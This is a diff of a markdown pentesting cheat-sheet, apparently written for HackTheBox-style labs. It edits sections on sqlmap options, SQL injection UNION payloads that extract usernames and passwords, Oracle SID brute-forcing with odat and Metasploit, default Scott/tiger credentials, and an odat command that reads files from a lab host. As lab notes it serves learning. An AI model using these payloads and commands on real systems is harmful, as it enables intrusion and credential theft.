@@ -60,23 +60,13 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 username=name&password=password
 ```
 
-### Arguments explained
-- `-r`
-    - To add the request log file
-
-**OPTIONAL**
-- `--string` 
-    - To filter a given phrase in the response
-- `--dump` 
-    - To dump the db
-
 #### References
 - [https://0xdf.gitlab.io/2018/06/23/htb-falafel.html](https://0xdf.gitlab.io/2018/06/23/htb-falafel.html)
 
 # SQL injection UNION attack
 
 ## Steps
-```
+```sql
 "test' union select 'table',database(),'C'-- "
 "test' union select 'table',username, password from db.table -- -"
 ```
@@ -111,10 +101,11 @@ Username --> Scott
 Password --> tiger
 ```
 
+## Brute force SID
 *Steps*    
 1. Use: `odat` and its `sidguesser` to bruteforce with a link provided
-2. Spin up metasploit and use auxiliary(admin/oracle/sid_brute)
-3. Use sqlplus to login with the creds or
+2. Use metasploit and use `auxiliary(admin/oracle/sid_brute)`
+3. Use `sqlplus` to login with the creds or
     1. Read file with odat as such:    `odat ctxsys -s 10.10.10.14 -d XE -U SCOTT -P tiger --sysdba --getFile flag.txt`
 
 
